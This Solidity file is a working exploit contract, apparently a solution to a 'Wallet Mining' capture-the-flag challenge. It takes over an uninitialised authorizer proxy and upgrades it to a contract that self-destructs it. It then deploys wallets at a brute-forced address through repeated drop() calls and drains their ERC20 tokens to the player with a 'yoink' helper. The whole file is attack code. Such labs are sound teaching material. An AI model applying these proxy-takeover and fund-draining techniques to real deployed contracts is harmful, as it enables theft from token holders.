// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./HackedAuthorizer.sol";
//import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
//import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";

interface IAuthorizer {
    function init(address[] memory _wards, address[] memory _aims) external;
    function upgradeToAndCall(address imp, bytes memory wat) external payable;
    function can(address usr, address aim) external view returns (bool);
}

interface IWalletDeployer {
    function drop(bytes memory wat) external returns (address aim);
}

interface IModuleManager {
    function enableModule(address module) external;
}

error boolError(bool);
error addrError(address);
error bytesError(bytes);

contract ExploitWalletMining {

    // The master copy is a gnosis safe
    // Authorizer is mom in WalletDeployer

    address wallDeployer;
    address authorizer;
    address token;
    address player;

    constructor(address _wallDeployer, address _authorizer, address _token, address _player) {

        wallDeployer = _wallDeployer;
        authorizer = _authorizer;
        token = _token;
        player = _player;
    }

    // Called via delegateCall by bruteforced address' module setup
    function enableModule(address module) external {
        IModuleManager(address(this)).enableModule(module);
    }

    // Called via delegatecall by bruteforced address module
    // Need to pass token because it might not exist in the delegatecall context
    function yoink(address receiver, address _token) public {
        uint256 amount = IERC20(_token).balanceOf(address(this));

        // transfer fails if amount is 0
        if(amount > 0)
            IERC20(_token).transfer(receiver, amount);
    }

    function exploit(address logicAddr) external {

        HackedAuthorizer hacked = new HackedAuthorizer();
        address[] memory test = new address[](1);

        test[0] = player;
        IAuthorizer(logicAddr).init(test, test);
        // Original contract has forceCall = true, just put something in
        IAuthorizer(logicAddr).upgradeToAndCall(address(hacked), abi.encodeWithSignature("destroy(address)", player));

        address[] memory owner = new address[](1);
        owner[0] = player;
        bytes memory payload = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,uint256,address)", owner, 1, address(0), "", address(0), 0, address(0));

        for(uint256 i=0;i<43;i++)
            IWalletDeployer(wallDeployer).drop(payload);

        uint256 amount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(player, amount);
    }

}